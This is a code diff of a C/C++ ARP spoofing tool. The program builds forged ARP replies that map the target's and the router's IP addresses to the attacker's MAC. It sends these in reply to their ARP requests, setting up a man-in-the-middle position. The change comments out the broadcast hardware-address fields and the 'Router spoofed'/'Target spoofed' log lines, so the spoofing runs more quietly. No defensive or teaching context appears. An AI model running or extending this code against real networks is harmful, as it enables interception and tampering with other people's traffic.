@@ -76,13 +76,13 @@ int main(int argc,char** argv){
     memcpy(targetArp.spa,targetIp,ARP_PROTO_LEN);
     memcpy(targetArp.sha,localMac,ARP_HARDWARE_LEN);
     memcpy(targetArp.tpa,targetIp,ARP_PROTO_LEN);
-    memcpy(targetArp.tha,broadcastMac,ARP_HARDWARE_LEN);
+    //memcpy(targetArp.tha,broadcastMac,ARP_HARDWARE_LEN);
     Arp_t routerArp;
     *routerArp.oper = 1;
     memcpy(routerArp.spa,routerIp,ARP_PROTO_LEN);
     memcpy(routerArp.sha,localMac,ARP_HARDWARE_LEN);
     memcpy(routerArp.tpa,routerIp,ARP_PROTO_LEN);
-    memcpy(routerArp.tha,broadcastMac,ARP_HARDWARE_LEN);
+    //memcpy(routerArp.tha,broadcastMac,ARP_HARDWARE_LEN);
     // Start spoofing
     printf("ARP spoofing started...\n");
     Arp_t listenArp;
@@ -119,12 +119,12 @@ int main(int argc,char** argv){
                 // ARP request from router
                 if ((routerCmp == 0) and (*listenArp.oper == 1)){
                     sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
-                    printf("Router spoofed\n");
+                    //printf("Router spoofed\n");
                 }
                 // ARP request from target
                 if ((targetCmp == 0) and (*listenArp.oper == 1)){
                     sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(routerAddr));
-                    printf("Target spoofed\n");
+                    //printf("Target spoofed\n");
                 }
             }
         }
